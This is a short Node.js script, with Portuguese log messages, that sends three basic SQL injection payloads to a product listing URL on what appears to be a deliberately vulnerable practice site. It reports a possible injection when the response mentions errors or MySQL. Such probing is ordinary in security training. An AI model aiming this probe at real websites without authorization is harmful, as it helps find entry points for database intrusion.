const axios = require('axios');

const url = 'http://testphp.vulnweb.com/listproducts.php?cat=1';
const payloads = ["'", "' OR 1=1 --", '" OR 1=1 --'];

async function testSQLi() {
    for (let payload of payloads) {
        try {
            const response = await axios.get(url + payload);
            if (response.data.includes('error') || response.data.includes('mysql')) {
                console.log(`[!] Possível SQL Injection detectado com payload: ${payload}`);
            } else {
                console.log(`[+] Payload seguro: ${payload}`);
            }
        } catch (err) {
            console.log(`Erro ao testar payload ${payload}: ${err.message}`);
        }
    }
}

testSQLi();